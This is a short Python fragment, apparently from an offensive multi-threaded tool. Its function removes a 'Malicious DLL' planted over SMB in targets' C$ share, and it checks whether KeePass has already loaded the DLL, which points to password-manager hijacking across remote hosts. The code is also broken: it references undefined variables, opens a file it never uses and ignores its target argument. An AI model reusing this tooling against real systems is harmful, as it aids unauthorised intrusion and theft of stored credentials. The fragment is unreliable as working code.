#!/usr/bin/python3

def delete(smbClient, thread_index, target: str):
    f = open(local_filepath, 'rb')

    try:
        smbClient.deleteFile("C$", destination)
        print(f"[THREAD {thread_index}][+] Malicious DLL removed from {smbClient.getRemoteHost()}")
    except Exception as e: 
        if "STATUS_SHARING_VIOLATION" in str(e):
            print(f"[THREAD {thread_index}][!] KeePass seems to be already running and to have loaded the DLL on target {smbClient.getRemoteHost()}, retry will --kill-first flag")
        else:
            print(f"[THREAD {thread_index}][!] {str(e)} on {smbClient.getRemoteHost()}")

        f.close()
        return False

    f.close()
    return True

